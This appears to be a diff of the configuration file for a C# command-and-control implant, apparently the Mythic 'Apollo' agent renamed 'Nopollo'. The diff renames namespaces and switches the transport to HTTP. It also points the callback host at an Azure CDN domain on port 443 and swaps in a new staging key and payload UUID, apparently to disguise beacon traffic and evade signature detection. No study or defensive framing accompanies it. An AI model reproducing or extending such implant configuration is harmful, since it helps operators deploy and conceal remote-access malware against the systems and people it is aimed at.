@@ -1,8 +1,8 @@
 ﻿#define C2PROFILE_NAME_UPPER
 
 #if DEBUG
-//#define HTTP
-#define WEBSOCKET
+#define HTTP
+//#define WEBSOCKET
 #endif
 
 #if HTTP
@@ -12,9 +12,9 @@ using System;
 using System.Collections.Generic;
 using System.Linq;
 using System.Text;
-using ApolloInterop.Structs.ApolloStructs;
+using NopolloInterop.Structs.ApolloStructs;
 using PSKCryptography;
-using ApolloInterop.Serializers;
+using NopolloInterop.Serializers;
 #if WEBSOCKET
 using WebsocketTransport;
 #endif
@@ -24,7 +24,7 @@ using NamedPipeTransport;
 #if TCP
 using TcpTransport;
 #endif
-namespace Apollo
+namespace Nopollo
 {
     public static class Config
     {
@@ -41,8 +41,8 @@ namespace Apollo
 #if DEBUG
                         { "callback_interval", "5" },
                         { "callback_jitter", "0" },
-                        { "callback_port", "80" },
-                        { "callback_host", "http://mythic" },
+                        { "callback_port", "443" },
+                        { "callback_host", "https://dev-cdn2.azureedge.net" },
                         { "post_uri", "data" },
                         { "encrypted_exchange_check", "T" },
                         { "proxy_host", "" },
@@ -149,7 +149,8 @@ namespace Apollo
         public static Dictionary<string, C2ProfileData> IngressProfiles = new Dictionary<string, C2ProfileData>();
 #if DEBUG
 #if HTTP
-        public static string StagingRSAPrivateKey = "Z16/29rxT59Ur23tVzIboE4UcnPGeWJcTszZYwJckOE= ";
+        // public static string StagingRSAPrivateKey = "Z16/29rxT59Ur23tVzIboE4UcnPGeWJcTszZYwJckOE= ";
+        public static string StagingRSAPrivateKey = "5O7CIS6OkjJMYxIy5oSvFmC2RFZ0X9Zq3THq8IByLZY=";
 #elif WEBSOCKET
         public static string StagingRSAPrivateKey = "Hl3IzCYy3io5QU70xjpYyCNrOmA84aWMZLkCwumrAFM=";
 #elif SMB
@@ -158,7 +159,8 @@ namespace Apollo
         public static string StagingRSAPrivateKey = "LbFpMoimB+aLx1pq0IqXJ1MQ4KIiGdp0LWju5jUhZRg=";
 #endif
 #if HTTP
-        public static string PayloadUUID = "9d4c064d-667b-49d1-99f0-ac310c72c394";
+        //public static string PayloadUUID = "9d4c064d-667b-49d1-99f0-ac310c72c394";
+        public static string PayloadUUID = "6cf12175-447f-46a1-8f54-52576779b1ff";
 #elif WEBSOCKET
         public static string PayloadUUID = "7546e204-aae4-42df-b28a-ade1c13594d2";
 #elif SMB
